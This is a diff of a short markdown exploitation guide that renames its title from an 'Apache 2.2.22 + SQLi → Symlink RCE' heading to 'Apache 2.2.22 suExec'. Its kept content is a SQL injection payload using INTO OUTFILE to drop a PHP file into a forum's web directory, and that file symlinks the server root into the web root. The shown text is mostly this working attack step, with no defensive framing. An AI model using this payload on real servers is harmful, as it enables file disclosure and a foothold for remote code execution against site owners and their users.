@@ -1,12 +1,10 @@
-# Apache 2.2.22 + SQLi → Symlink RCE Exploitation
+# Apache 2.2.22 suExec
 
 ## 1 — SQL Injection to write the PHP payload
 
 ```sql
 SELECT '<?php symlink("/", "search.php"); echo "OK"; ?>'
 INTO OUTFILE '/var/www/forum/templates_c/test3.php'
-FIELDS TERMINATED BY '' ENCLOSED BY '' ESCAPED BY ''
-LINES TERMINATED BY '';
 ```
 
 ---
